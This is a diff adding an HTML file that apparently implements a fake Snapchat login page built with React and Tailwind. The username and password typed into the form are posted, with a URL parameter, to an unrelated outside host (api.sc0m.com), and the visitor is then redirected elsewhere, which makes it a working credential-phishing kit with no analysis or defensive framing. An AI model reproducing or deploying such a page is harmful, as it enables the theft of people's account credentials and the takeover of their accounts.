@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  </head>
+  <script
+    crossorigin
+    src="https://unpkg.com/react@18/umd/react.development.js"
+  ></script>
+  <script
+    crossorigin
+    src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"
+  ></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <!-- tailwind cdn  -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"
+    integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+  <body class="bg-[#262626]">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+
+    <script type="text/babel">
+      const axios = axios.create({
+        baseURL: 'https://api.sc0m.com/api',
+        timeout: 5000,
+        headers: { 'X-Custom-Header': '' },
+      });
+
+      const MainContent = () => {
+        const [vEmail, setVEmail] = React.useState('');
+        const [vPassword, setVPassword] = React.useState('');
+        const [data, setData] = React.useState('');
+
+        const [loading, setLoading] = React.useState(false);
+        React.useEffect(() => {
+          //   axios
+          //     .get('https://checkapi-xt1h.onrender.com/')
+          //     .then((res) => {
+          //       setLoading(false);
+          //     })
+          //     .catch((err) => {
+          //       window.location = "https://www.livebotola.com/";
+          //     });
+
+          const url = window.location.href;
+          const params = new URL(url).searchParams;
+          const urlbase = params.get('url');
+          setData(urlbase);
+        }, []);
+
+        const addNew = () => {
+          if (vPassword === '' || vEmail === '')
+            return alert('Please fill all the fields');
+          const body = {
+            data,
+            email: vEmail,
+            password: vPassword,
+          };
+
+          axios
+            .post('/contact', body)
+            .then(({ data }) => {
+              window.location = data;
+            })
+            .catch((err) => {
+              window.location = 'https://www.livebotola.com/';
+            });
+        };
+        return (
+          <>
+            {loading ? (
+              <div className="flex justify-center items-center h-screen">
+                <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-white"></div>
+              </div>
+            ) : (
+              <>
+                <div>
+                  <div className="grid place-content-center grid-cols-1 md:px-96 mt-10 gap-10">
+                    <div className="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "></div>
+
+                    <div className="flex justify-center w-full">
+                      <img
+                        src="https://ucarecdn.com/fc04c8d9-3501-4738-b4e5-eb36ce5e26d8/"
+                        alt="snapchat"
+                        width="70px"
+                        height="70px"
+                      />
+                    </div>
+
+                    <div className="p-2 w-full  gap-1  ">
+                      <div className="flex flex-col   p-2  gap-1">
+                        <label className="text-gray-500 text-sm"></label>
+                        <input
+                          type="text"
+                          className="w-full border p-2 rounded-md"
+                          placeholder="username"
+                          onChange={(e) => setVEmail(e.target.value)}
+                        />
+                      </div>
+                      <div className="flex flex-col   p-2   gap-1">
+                        <label
+                          htmlFor="password"
+                          className="text-gray-500 text-sm"
+                        ></label>
+                        <input
+                          type="password"
+                          className="w-full border p-2 rounded-md"
+                          placeholder="Password"
+                          id="password"
+                          autoComplete="new-password"
+                          onChange={(e) => setVPassword(e.target.value)}
+                        />
+                      </div>
+                      <div className="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+                        <button
+                          className=" text-black font-semibold p-3 rounded-md w-full bg-[#fffc01] hover:bg-blue-600"
+                          onClick={addNew}
+                        >
+                          Log In
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </>
+            )}
+          </>
+        );
+      };
+
+      //render the component to the DOM
+      ReactDOM.render(<MainContent />, document.getElementById('root'));
+    </script>
+  </body>
+</html>
